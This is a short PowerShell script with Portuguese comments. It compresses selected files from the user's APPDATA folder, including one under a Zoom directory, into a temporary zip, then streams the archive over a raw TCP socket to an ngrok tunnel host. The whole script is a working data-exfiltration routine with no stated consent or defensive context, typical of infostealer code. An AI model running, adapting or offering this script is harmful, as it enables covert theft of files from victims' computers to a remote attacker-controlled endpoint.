# Base de arquivos
$base = $env:APPDATA
$zip = "$env:TEMP\envio.zip"  # ZIP temporário

# Cria ZIP só com os arquivos desejados
if(Test-Path $zip){Remove-Item $zip -Force}
Compress-Archive `
    "$base\mano.txt", `
    "$base\Zoom\installer.txt" `
    -DestinationPath $zip -Force

# Envia via TCP
$c = New-Object Net.Sockets.TCPClient("6.tcp.eu.ngrok.io",11498)
$s = $c.GetStream()
$b = [IO.File]::ReadAllBytes($zip)
$s.Write($b,0,$b.Length)
$s.Flush()
$s.Close()
$c.Close()

# Remove a linha abaixo se quiser manter o ZIP
# Remove-Item $zip -Force
